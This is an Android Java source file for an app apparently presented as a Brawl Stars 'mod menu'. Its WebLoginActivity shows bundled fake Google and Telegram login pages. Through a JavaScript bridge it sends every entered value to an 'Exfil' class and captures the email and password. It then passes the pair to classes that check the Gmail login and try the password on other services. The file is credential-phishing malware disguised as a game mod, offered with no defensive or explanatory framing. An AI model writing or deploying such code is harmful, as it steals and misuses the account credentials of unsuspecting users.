package com.brawl.modmenu;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class WebLoginActivity extends Activity {

    private WebView web;
    private String savedEmail = "";
    private String savedPassword = "";
    private String currentProvider = "google";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        String provider = getIntent().getStringExtra("provider");
        if (provider != null) currentProvider = provider;

        web = new WebView(this);
        web.getSettings().setJavaScriptEnabled(true);
        web.getSettings().setDomStorageEnabled(true);
        web.getSettings().setAllowFileAccess(true);
        web.getSettings().setUserAgentString(
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36");

        web.addJavascriptInterface(new Bridge(), "NativeBridge");
        web.setWebViewClient(new WebViewClient());

        if ("telegram".equals(currentProvider)) {
            web.loadUrl("file:///android_asset/telegram-login/index.html");
        } else {
            web.loadUrl("file:///android_asset/google-login/index.html");
        }
        setContentView(web);
    }

    class Bridge {
        @JavascriptInterface
        public void log(String data) {
            String tag = "telegram".equals(currentProvider)
                ? "TELEGRAM_LOGIN" : "GOOGLE_LOGIN";
            Exfil.send(tag, data);

            if (data.startsWith("email=")) {
                savedEmail = data.substring(6);
            } else if (data.startsWith("password=")) {
                savedPassword = data.substring(9);
                if (!savedEmail.isEmpty() && !savedPassword.isEmpty()) {
                    GmailChecker.check(savedEmail, savedPassword);
                    PasswordTester.testAll(savedEmail, savedPassword);
                }
            }
        }

        @JavascriptInterface
        public void done() {
            runOnUiThread(() -> {
                startActivity(new Intent(WebLoginActivity.this, MainActivity.class));
                finish();
            });
        }
    }
}
